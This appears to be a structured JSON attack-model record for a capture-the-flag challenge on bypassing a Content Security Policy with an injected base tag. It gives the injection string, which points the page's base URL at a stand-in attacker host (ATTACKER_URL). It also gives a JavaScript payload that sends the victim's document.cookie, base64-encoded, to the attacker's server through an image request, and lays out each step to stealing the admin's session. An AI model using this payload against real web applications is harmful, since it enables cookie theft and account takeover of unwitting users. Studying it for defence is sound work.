{
    "AttackModel": {
        "NameOfTheChallenge": "Content Security Policy bypass using base tag",
        "AttackerCapabilities": [
            "HTML injection",
            "Understanding of Content Security Policy",
            "Ability to host scripts on a server",
            "Knowledge of document.cookie"
        ],
        "Target": {
            "Type": "Web Application",
            "Vulnerabilities": [
                "HTML injection through the src= parameter",
                "CSP does not allow loading of arbitrary scripts"
            ],
            "SecurityMeasures": [
                "Content Security Policy (CSP) with specific restrictions on script-src"
            ]
        },
        "Steps": [
            {
                "StepNumber": 1,
                "Description": "Inject HTML code to bypass CSP",
                "ToolsUsed": null,
                "StepDetails": {
                    "Hypothesis": "The attacker wants to bypass the CSP restrictions to load arbitrary scripts.",
                    "Action": "Inject the following HTML code: '?src=/img/saturn.jpg'><base href=\"http://ATTACKER_URL\">'",
                    "Result": "The base URL of the document is set to 'http://ATTACKER_URL' and the script 'assets/js/bootstrap.js' is loaded from the attacker-controlled site.",
                    "Success": "Success",
                    "FailingReason": null
                }
            },
            {
                "StepNumber": 2,
                "Description": "Host a script on the attacker's server",
                "ToolsUsed": null,
                "StepDetails": {
                    "Hypothesis": "The attacker wants to execute a specific script on the target server.",
                    "Action": "Host the following script on the attacker's server:\n```javascript\nlet img = document.createElement('img');\nimg.src = \"/?\" + btoa(document.cookie)\ndocument.body.appendChild(img);\n```",
                    "Result": "The script is hosted on the attacker's server and will be executed on the target server.",
                    "Success": "Success",
                    "FailingReason": null
                }
            },
            {
                "StepNumber": 3,
                "Description": "Fetch the admin's cookie",
                "ToolsUsed": null,
                "StepDetails": {
                    "Hypothesis": "The attacker wants to retrieve the admin's cookie for unauthorized access.",
                    "Action": "The injected script will cause the browser to fetch '/?' + btoa(document.cookie), which will be logged on the attacker's server.",
                    "Result": "The admin's cookie is logged on the attacker's server, allowing unauthorized access.",
                    "Success": "Success",
                    "FailingReason": null
                }
            }
        ]
    }
}